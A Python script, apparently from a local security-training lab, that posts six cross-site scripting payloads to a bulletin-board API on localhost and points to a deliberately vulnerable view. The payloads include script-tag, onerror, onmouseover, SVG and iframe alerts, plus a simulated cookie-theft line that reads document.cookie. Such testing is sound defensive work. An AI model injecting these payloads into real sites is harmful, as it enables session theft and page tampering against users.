"""
XSS 테스트 페이로드 자동 삽입 스크립트

!! 격리된 Docker 환경에서만 사용할 것 !!

사용법:
  pip install httpx
  python security/scripts/xss_payloads.py
"""
import httpx

BASE_URL = "http://localhost:8000"

PAYLOADS = [
    {
        "name": "Basic Script Tag",
        "title": "XSS Test - Script",
        "content": '<script>alert("XSS")</script>',
    },
    {
        "name": "Img OnError",
        "title": "XSS Test - Img",
        "content": '<img src=x onerror="alert(\'XSS via img\')">',
    },
    {
        "name": "Event Handler",
        "title": "XSS Test - Event",
        "content": '<div onmouseover="alert(\'Hover XSS\')">마우스를 올려보세요</div>',
    },
    {
        "name": "Cookie Theft (Simulated)",
        "title": "XSS Test - Cookie",
        "content": '<script>document.title="Stolen: "+document.cookie</script>',
    },
    {
        "name": "SVG XSS",
        "title": "XSS Test - SVG",
        "content": '<svg onload="alert(\'SVG XSS\')">',
    },
    {
        "name": "Iframe Injection",
        "title": "XSS Test - Iframe",
        "content": '<iframe src="javascript:alert(\'iFrame XSS\')"></iframe>',
    },
]


def run_xss_test():
    """XSS 페이로드 자동 삽입 테스트"""
    print("=== XSS Payload Test ===")
    print(f"Target: {BASE_URL}")
    print()

    for payload in PAYLOADS:
        try:
            resp = httpx.post(
                f"{BASE_URL}/api/posts/",
                json={"title": payload["title"], "content": payload["content"]},
            )
            status = "OK" if resp.status_code == 201 else f"FAIL ({resp.status_code})"
            print(f"  [{status}] {payload['name']}: {payload['content'][:50]}...")
        except Exception as e:
            print(f"  [ERR] {payload['name']}: {e}")

    print()
    print("게시판에서 Vulnerable View로 확인하세요:")
    print("  http://localhost/posts")


if __name__ == "__main__":
    run_xss_test()
